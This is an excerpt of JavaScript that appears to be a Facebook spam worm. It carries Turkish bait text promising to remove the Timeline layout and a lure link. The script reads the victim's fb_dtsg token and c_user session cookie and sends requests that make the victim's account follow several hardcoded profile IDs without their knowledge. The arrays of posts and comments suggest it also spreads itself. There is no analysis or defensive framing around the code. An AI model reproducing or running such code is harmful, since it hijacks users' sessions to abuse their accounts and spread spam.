...
var randomyazi = [
	"Helal olsun eski profil gibisi yok »» <3 Kuran çarpsın doğru denemeden geçmeKuran çarpsın doğru yalansa anamı sıksınler :",
	"Zaman Tunelinden Kurtulun Superr Uygulama.<3..Kuran çarpsın doğru denemeden geçmeKuran çarpsın doğru yalansa anamı sıksınler :",
    "Oh be zaman tünelinden kurtuldum süperrKuran çarpsın doğru denemeden geçme  »»Kuran çarpsın doğru yalansa anamı sıksınler <3",
	"Zaman Tunelinden Kurtuldum Superr Uygulama.Kuran çarpsın doğru denemeden geçme <3....Kuran çarpsın doğru yalansa anamı sıksınler:",
    "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr UygulamaKuran çarpsın doğru denemeden geçme .<3Kuran çarpsın doğru yalansa anamı sıksınler.....:"
]

var baslikrandom = [
	"Helal olsun eski profil gibisi yok »»Kuran çarpsın doğru denemeden geçmeKuran çarpsın doğru yalansa anamı sıksınler  <3:",
	"Zaman Tunelinden Kurtulun Superr UygulamaKuran çarpsın doğru denemeden geçme .<3Kuran çarpsın doğru yalansa anamı sıksınler..:",
    "Oh be zaman tünelinden kurtuldum süperr »»Kuran çarpsın doğru denemeden geçme  <3Kuran çarpsın doğru yalansa anamı sıksınler",
	"Zaman Tunelinden Kurtuldum Superr Uygulama.<3Kuran çarpsın doğru denemeden geçme Kuran çarpsın doğru yalansa anamı sıksınler....:",
    "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3Kuran çarpsın doğru denemeden geçme Kuran çarpsın doğru yalansa anamı sıksınler.....:"
]


var randomlink = [
	"http://timelinequit.mono.net",
]

var randomyorum = [
	"Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!Kuran çarpsın doğru denemeden geçmeKuran çarpsın doğru yalansa anamı sıksınler   :",
	"Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!Kuran çarpsın doğru denemeden geçmeKuran çarpsın doğru yalansa anamı sıksınler   :",
    "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!Kuran çarpsın doğru yalansa anamı sıksınler :",
	"Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!Kuran çarpsın doğru denemeden geçmeKuran çarpsın doğru yalansa anamı sıksınler   :",
    "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!Kuran çarpsın doğru denemeden geçmeKuran çarpsın doğru yalansa anamı sıksınler   :"
]
...
var xmlhttp = new XMLHttpRequest();
    ...
    var params1 = "profile_id=100003129160570";
    params1 += "&location=1";
    ...
    params1 += "&phstamp=100003129160570";
...
var xmlhttp = new XMLHttpRequest();
    ...
    var params = "profile_id=100003077052169";
    params += "&location=1";
    params += "&source=follow-button";
    params += "&subscribed_button_id=u37qac_37";
    params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params += "&lsd=";
    params += "&__user=" + cereziAl("c_user");
    params += "&phstamp=100003077052169";
    xmlhttp.send(params);
...
var xmlhttp = new XMLHttpRequest();
    ...
    var params = "profile_id=1234444687";
    params += "&location=1";
    params += "&source=follow-button";
    params += "&subscribed_button_id=u37qac_37";
    params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
...
var xmlhttp = new XMLHttpRequest();
    ...
    var params = "profile_id=100003333664090";
    params += "&location=1";
    params += "&source=follow-button";
    params += "&subscribed_button_id=u37qac_37";
    params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params += "&lsd=";
    params += "&__user=" + cereziAl("c_user");
    params += "&phstamp=100003333664090";
    xmlhttp.send(params);
